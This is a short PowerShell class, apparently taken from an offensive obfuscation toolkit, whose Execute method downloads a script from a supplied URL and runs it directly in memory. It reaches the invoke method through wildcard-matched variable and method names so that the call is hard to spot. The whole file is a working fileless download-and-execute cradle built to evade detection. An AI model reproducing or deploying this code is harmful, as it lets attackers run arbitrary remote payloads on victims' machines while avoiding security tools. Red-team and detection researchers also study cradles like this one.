Class ObfDownloadFileContent12 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\6
        (GV *uti*t).Value.InvokeCommand|%{$_.(((GV *uti*t).Value.InvokeCommand.PsObject.Methods|?{$_.Name-clike'*k*i*t'}).Name).Invoke((New-Object Net.WebClient).DownloadString($url))}
    }

}